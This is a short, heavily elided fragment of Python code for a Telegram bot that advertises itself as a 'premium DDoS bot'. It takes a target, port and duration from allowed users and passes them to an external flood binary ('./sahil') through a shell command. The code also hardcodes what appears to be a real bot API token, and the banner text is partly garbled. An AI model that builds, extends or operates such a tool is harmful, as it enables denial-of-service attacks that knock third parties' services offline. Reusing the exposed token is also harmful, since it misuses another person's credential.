...
bot = telebot.TeleBot('7103790461:AAFaVh-VxbTAhxdBL0Ro8g53ZDoyhSm6mt4')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./sahil {target} {port} {time} 1000 100"
...
def welcome_start(message):
    ...
    response = f'''❄️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧, {user_name}! 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗛𝗜𝗚𝗛 𝗤𝗨𝗔𝗟𝗜??𝗬 ??𝗘??𝗩𝗘𝗥 𝗕𝗔𝗦𝗘𝗗 𝗗𝗗𝗢𝗦 𝗧𝗢 ??𝗘𝗧 𝗔𝗖𝗖𝗘𝗦𝗦.
